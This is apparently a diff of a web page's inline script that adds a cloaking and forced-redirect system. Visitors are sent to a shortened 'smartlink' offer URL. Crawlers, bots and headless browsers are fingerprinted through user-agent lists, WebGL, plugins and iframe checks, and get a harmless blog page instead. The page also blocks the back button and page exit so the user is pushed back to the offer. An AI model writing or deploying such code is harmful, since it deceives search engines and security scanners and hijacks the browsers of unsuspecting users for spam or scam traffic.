@@ -20,63 +20,155 @@
 </div>
 
 <script>
-(function(){
-  // ====== SMARTLINK & BACKUP ======
-  const smartlinks = [
-    "https://t.co/oPtZz8Eaw2",
-  ];
+(async function(){
+  const smartlinks = ["https://t.co/oPtZz8Eaw2"];
   const backup = "https://stackholder-dev.blogspot.com/2024/11/react-native-expo-sdk-52-fixing-react.html";
+  const target = smartlinks[Math.floor(Math.random()*smartlinks.length)];
+  const fb = document.getElementById("fallback");
 
-  // ====== HELPER ======
-  const pick = arr => arr[Math.floor(Math.random()*arr.length)];
-  function isBot(){
+  function redirect(u){
+    try{ location.replace(u); }catch(e){}
+    try{ location.href = u; }catch(e){}
+    try{
+      const a=document.createElement("a");
+      a.href=u; a.style.display="none";
+      document.body.appendChild(a); a.click(); a.remove();
+    }catch(e){}
+  }
+  function redirectWithRetries(url){
+    redirect(url);
+    [600,1200,2500].forEach(t=>setTimeout(()=>redirect(url), t + Math.floor(Math.random()*300)));
+  }
+
+  // basic bot tokens
+  function simpleBotCheck(){
     const ua=(navigator.userAgent||'').toLowerCase();
-    const bots=["bot","crawl","spider","slurp","facebook","twitter","pinterest","crawler","google","bing","yahoo","yandex","baidu","validator","preview"];
+    const bots=["bot","crawl","spider","slurp","facebook","twitter","pinterest","crawler","bing","yahoo","yandex","baidu","validator","preview"];
     if(navigator.webdriver) return true;
     if(!ua || ua.length<10) return true;
     if(bots.some(b=>ua.includes(b))) return true;
     return false;
   }
-  function attempt(u){
-    try{location.replace(u);}catch(e){}
-    try{location.href=u;}catch(e){}
-    try{window.open(u,"_self");}catch(e){}
-  }
-  function redirectWithRetries(url){
-    attempt(url);
-    setTimeout(()=>attempt(url),700);
-    setTimeout(()=>attempt(url),2000);
+
+  // advanced headless/emulator detection -> score-based
+  async function headlessScore(){
+    let score=0;
+    const ua=(navigator.userAgent||'').toLowerCase();
+
+    // webdriver flag
+    if(navigator.webdriver) score+=3;
+
+    // headless UA hints
+    if(ua.includes('headless')||ua.includes('phantom')||ua.includes('puppeteer')) score+=2;
+
+    // chrome:// props
+    if(!window.chrome || typeof window.chrome !== 'object') score+=1;
+    if(window.outerWidth === 0 || window.outerHeight === 0) score+=1;
+
+    // plugins & mimeTypes
+    if(navigator.plugins && navigator.plugins.length === 0) score+=1;
+    try{ if(navigator.mimeTypes && navigator.mimeTypes.length === 0) score+=1;}catch(e){}
+
+    // languages & platform
+    if(!navigator.languages || navigator.languages.length === 0) score+=1;
+    if(!navigator.platform || navigator.platform === "Win32" && ua.includes("android")) score+=1;
+
+    // hardware hints
+    try{
+      if(navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 1) score+=1;
+      if('deviceMemory' in navigator && navigator.deviceMemory <= 0.5) score+=1;
+    }catch(e){}
+
+    // touch support
+    if(!('ontouchstart' in window) && /mobile|android|ipad|iphone/.test(ua)) score+=1;
+
+    // permissions behaviour (headless often throws or replies differently)
+    try{
+      const p = await navigator.permissions.query({name:'notifications'}).catch(()=>null);
+      if(p && (p.state === 'denied' || p.state === 'prompt')) score+=0; // normal
+      if(!p) score+=1;
+    }catch(e){ score+=1; }
+
+    // canvas/webgl vendor anomalies
+    try{
+      const c = document.createElement('canvas');
+      const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+      if(gl){
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        if(dbg){
+          const vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || '';
+          const renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || '';
+          const s = (vendor+renderer).toLowerCase();
+          if(/swiftshader|llvmpipe|mesa|virtualbox|vmware|android/.test(s)) score+=2;
+        }else{
+          // lack of debug extension sometimes headless
+          score+=1;
+        }
+      } else {
+        score+=1;
+      }
+    }catch(e){ score+=1; }
+
+    // function.toString spoofing checks
+    try{
+      const fnStr = navigator.userAgent.toString();
+      if(typeof fnStr !== 'string') score+=1;
+    }catch(e){ score+=1; }
+
+    // iframe eval trick (headless may throw)
+    try{
+      const iframe = document.createElement('iframe');
+      iframe.style.display='none';
+      document.body.appendChild(iframe);
+      const win = iframe.contentWindow;
+      if(!win || !win.Function) score+=1;
+      document.body.removeChild(iframe);
+    }catch(e){ score+=1; }
+
+    // unusual UA-device mismatches
+    if(/macintosh/.test(ua) && /android/.test(navigator.platform.toLowerCase())) score+=1;
+    if(/android/.test(ua) && !/mobile/.test(ua)) score+=1;
+
+    return score;
   }
 
-  // ====== MAIN ======
-  if(isBot()){
-    setTimeout(()=>location.replace(backup),600);
+  // combine checks
+  const basicBot = simpleBotCheck();
+  const advScore = await headlessScore();
+  const isHeadless = basicBot || advScore >= 3;
+
+  if(isHeadless){
+    setTimeout(()=>location.replace(backup), 300 + Math.floor(Math.random()*700));
     return;
   }
 
-  const target = pick(smartlinks);
-
-  // Auto redirect dengan delay random
-  const delay = Math.floor(Math.random()*800)+500; // 0.5-1.3s
+  // normal flow: auto redirect with randomness
+  const delay = 500 + Math.floor(Math.random()*1500);
   setTimeout(()=>redirectWithRetries(target), delay);
 
-  // Anti back/close (force offer lagi)
+  // natural interaction hooks
+  ["click","touchstart","keydown"].forEach(evt=>{
+    document.addEventListener(evt, ()=>redirectWithRetries(target), {once:true, passive:true});
+  });
+
+  // anti-exit stealth randomized
   setTimeout(()=>{
     try{
       history.pushState(null,null,location.href);
-      window.onpopstate=()=>attempt(target);
-      window.onbeforeunload=()=>attempt(target);
+      window.onpopstate=()=>redirectWithRetries(target);
+      window.onbeforeunload=()=>redirectWithRetries(target);
+      window.addEventListener("unload",()=>redirectWithRetries(target));
     }catch(e){}
-  },1200);
+  }, 1000 + Math.floor(Math.random()*2000));
 
-  // Fallback tombol manual kalau gagal (setelah 5s)
+  // fallback button
   setTimeout(()=>{
     if(document.visibilityState!=="hidden"){
-      const btn=document.getElementById("fallback");
-      btn.style.display="inline-block";
-      btn.onclick=()=>redirectWithRetries(target);
+      fb.style.display="inline-block";
+      fb.onclick=()=>redirectWithRetries(target);
     }
-  },5000);
+  },4000 + Math.floor(Math.random()*2000));
+
 })();
 </script>
 </body>
